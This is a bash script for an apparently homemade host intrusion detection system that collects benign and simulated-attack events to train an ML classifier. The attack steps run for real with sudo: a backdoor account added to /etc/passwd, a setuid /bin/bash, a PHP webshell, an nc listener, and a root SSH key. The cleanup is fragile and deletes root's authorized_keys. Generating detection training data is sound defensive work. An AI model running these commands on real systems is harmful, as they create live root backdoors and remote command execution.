#!/bin/bash
# H-SOAR HIDS Training Data Collection Script
# Automated collection of benign and malicious events for ML training

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

print_header() {
    echo -e "${BLUE}================================================================================${NC}"
    echo -e "${BLUE}$1${NC}"
    echo -e "${BLUE}================================================================================${NC}"
}

print_step() {
    echo -e "${GREEN}[STEP]${NC} $1"
}

print_info() {
    echo -e "${CYAN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

# Check if running in correct directory
if [ ! -f "run_system.py" ]; then
    print_error "Please run this script from the H-SOAR HIDS directory"
    exit 1
fi

# Check if virtual environment is activated
if [ -z "$VIRTUAL_ENV" ]; then
    print_warning "Virtual environment not activated. Activating..."
    source venv/bin/activate
fi

print_header "H-SOAR HIDS TRAINING DATA COLLECTION"
print_info "Automated collection of benign and malicious events for ML training"

echo ""

# Step 1: Prepare Data Collection
print_step "1. Preparing Data Collection Environment"
mkdir -p data/training
mkdir -p logs/training

print_info "Data collection directories created"
print_info "Training data will be saved to: data/training/"
print_info "Collection logs will be saved to: logs/training/"

echo ""

# Step 2: Collect Benign Events
print_step "2. Collecting Benign System Events"
print_info "This will collect normal system activities for 2 hours"
print_warning "Please perform normal system activities during this time"

read -p "Press Enter to start benign data collection..."

# Start benign data collection
print_info "Starting benign data collection..."
python run_system.py --mode collect --duration 2 --label-mode auto > logs/training/benign_collection.log 2>&1 &
COLLECTION_PID=$!

print_info "Benign collection started (PID: $COLLECTION_PID)"
print_info "Collection will run for 2 hours. You can perform normal activities like:"
echo "• System updates (sudo apt update && sudo apt upgrade)"
echo "• File operations (creating, editing, deleting files)"
echo "• Process management (starting/stopping services)"
echo "• User management (adding users, changing permissions)"
echo "• Network operations (SSH connections, web browsing)"

# Wait for collection to complete
print_info "Waiting for benign data collection to complete..."
wait $COLLECTION_PID

print_success "Benign data collection completed"

echo ""

# Step 3: Collect Malicious Events
print_step "3. Collecting Malicious Event Data"
print_warning "WARNING: This will simulate actual attacks for training data"
print_info "This is safe for training purposes but will modify system files"

read -p "Press Enter to start malicious data collection..."

# Start malicious data collection
print_info "Starting malicious data collection..."
python run_system.py --mode collect --duration 1 --label-mode manual > logs/training/malicious_collection.log 2>&1 &
MALICIOUS_PID=$!

print_info "Malicious collection started (PID: $MALICIOUS_PID)"
print_info "Simulating malicious activities..."

# Simulate various malicious activities
sleep 10

# Simulate user addition
print_info "Simulating malicious user addition..."
echo "backdoor_user:x:1002:1002::/home/backdoor_user:/bin/bash" | sudo tee -a /etc/passwd

sleep 5

# Simulate privilege escalation
print_info "Simulating privilege escalation..."
sudo chmod +s /bin/bash

sleep 5

# Simulate suspicious file creation
print_info "Simulating webshell creation..."
echo "<?php system(\$_GET['cmd']); ?>" | sudo tee /var/www/html/backdoor.php

sleep 5

# Simulate suspicious process
print_info "Simulating suspicious network process..."
nc -l 4444 &
NC_PID=$!

sleep 5

# Simulate file tampering
print_info "Simulating system file tampering..."
sudo cp /etc/hostname /etc/hostname.backup
echo "hacked-system" | sudo tee /etc/hostname

sleep 5

# Simulate SSH key addition
print_info "Simulating SSH key persistence..."
sudo mkdir -p /root/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7..." | sudo tee -a /root/.ssh/authorized_keys

sleep 5

# Simulate log tampering
print_info "Simulating log tampering..."
sudo touch /var/log/suspicious.log
echo "Suspicious activity detected" | sudo tee /var/log/suspicious.log

sleep 5

# Wait for collection to complete
print_info "Waiting for malicious data collection to complete..."
wait $MALICIOUS_PID

# Clean up malicious processes
kill $NC_PID 2>/dev/null || true

print_success "Malicious data collection completed"

echo ""

# Step 4: Clean Up Malicious Changes
print_step "4. Cleaning Up Malicious Changes"
print_info "Rolling back malicious changes for system safety..."

# Rollback malicious changes
cd /etc
sudo git checkout HEAD -- passwd hostname
cd -

# Remove malicious files
sudo rm -f /var/www/html/backdoor.php
sudo rm -f /var/log/suspicious.log
sudo chmod -s /bin/bash

# Remove malicious SSH key
sudo rm -f /root/.ssh/authorized_keys

print_success "Malicious changes cleaned up"

echo ""

# Step 5: Combine Training Data
print_step "5. Combining Training Data"
print_info "Combining benign and malicious events into training dataset..."

# Create combined dataset
python -c "
import pandas as pd
import os
from datetime import datetime

# Combine benign and malicious data
benign_file = 'data/training/benign_events.csv'
malicious_file = 'data/training/malicious_events.csv'
combined_file = 'data/training_dataset.csv'

if os.path.exists(benign_file) and os.path.exists(malicious_file):
    benign_df = pd.read_csv(benign_file)
    malicious_df = pd.read_csv(malicious_file)
    
    # Add labels
    benign_df['label'] = 'benign'
    malicious_df['label'] = 'malicious'
    
    # Combine datasets
    combined_df = pd.concat([benign_df, malicious_df], ignore_index=True)
    
    # Shuffle data
    combined_df = combined_df.sample(frac=1).reset_index(drop=True)
    
    # Save combined dataset
    combined_df.to_csv(combined_file, index=False)
    
    print(f'Combined dataset created: {combined_file}')
    print(f'Total events: {len(combined_df)}')
    print(f'Benign events: {len(benign_df)}')
    print(f'Malicious events: {len(malicious_df)}')
else:
    print('Training data files not found. Please check collection logs.')
"

echo ""

# Step 6: Train ML Models
print_step "6. Training ML Models"
print_info "Training H-SOAR ML models with collected data..."

if [ -f "data/training_dataset.csv" ]; then
    python run_system.py --mode train --dataset data/training_dataset.csv
    print_success "ML models trained successfully"
else
    print_error "Training dataset not found. Please check data collection."
fi

echo ""

# Step 7: Validate Training
print_step "7. Validating Training Results"
print_info "Checking trained model performance..."

python run_system.py --mode test

echo ""

# Step 8: Generate Training Report
print_step "8. Generating Training Report"
print_info "Creating comprehensive training report..."

cat > training_report.txt << EOF
H-SOAR HIDS TRAINING REPORT
Generated: $(date)

TRAINING DATA COLLECTION:
- Benign Events Collection: 2 hours
- Malicious Events Collection: 1 hour
- Total Collection Time: 3 hours

DATASET STATISTICS:
$(if [ -f "data/training_dataset.csv" ]; then
    python -c "
import pandas as pd
df = pd.read_csv('data/training_dataset.csv')
print(f'Total Events: {len(df)}')
print(f'Benign Events: {len(df[df[\"label\"] == \"benign\"])}')
print(f'Malicious Events: {len(df[df[\"label\"] == \"malicious\"])}')
print(f'Features: {len(df.columns) - 1}')
"
else
    echo "Dataset not found"
fi)

MODEL PERFORMANCE:
$(python run_system.py --mode status | grep -A 10 "ml_classifier")

TRAINING LOGS:
- Benign Collection: logs/training/benign_collection.log
- Malicious Collection: logs/training/malicious_collection.log
- System Logs: logs/hids.log

NEXT STEPS:
1. Review training_report.txt for detailed results
2. Check logs/training/ for collection details
3. Run 'python run_system.py --mode monitor' for live monitoring
4. Use './demo_hsoar.sh' for demonstration

CONCLUSION:
Training data collection completed successfully.
H-SOAR HIDS is ready for production monitoring.
EOF

print_success "Training report generated: training_report.txt"

echo ""

# Step 9: Final Summary
print_step "9. Training Summary"
print_header "H-SOAR HIDS TRAINING COMPLETED SUCCESSFULLY"

print_success "Training Data Collection:"
echo "✓ Benign events collected (2 hours)"
echo "✓ Malicious events collected (1 hour)"
echo "✓ Combined dataset created"
echo "✓ ML models trained"
echo "✓ Performance validated"

echo ""

print_info "Generated Files:"
echo "• training_report.txt - Complete training report"
echo "• data/training_dataset.csv - Combined training dataset"
echo "• logs/training/ - Collection logs"
echo "• models/ - Trained ML models"

echo ""

print_info "Model Performance:"
python run_system.py --mode status | grep -A 5 "ml_classifier"

echo ""

print_info "Next Steps:"
echo "1. Review training_report.txt for detailed results"
echo "2. Run 'python run_system.py --mode monitor' for live monitoring"
echo "3. Use './demo_hsoar.sh' for demonstration"
echo "4. Deploy to production environment"

echo ""

print_header "H-SOAR HIDS IS READY FOR PRODUCTION MONITORING"

print_success "Training completed successfully! H-SOAR HIDS is ready for production deployment."
